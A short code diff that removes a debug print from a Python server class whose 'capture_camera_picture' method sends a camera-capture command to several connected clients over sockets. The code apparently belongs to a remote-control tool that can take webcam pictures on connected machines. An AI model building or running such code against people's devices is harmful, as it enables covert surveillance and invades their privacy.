@@ -215,7 +215,6 @@ class Server:
                 print("[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
 
     def capture_camera_picture(self, path_to_save, connections):
-        print("w" + str(self.camera_port) + " " + path_to_save)
         for connection in connections:
             try:
                 self.connection.send(("w" + str(self.camera_port) + " " + path_to_save).encode(self.connection.CODEC), connection)
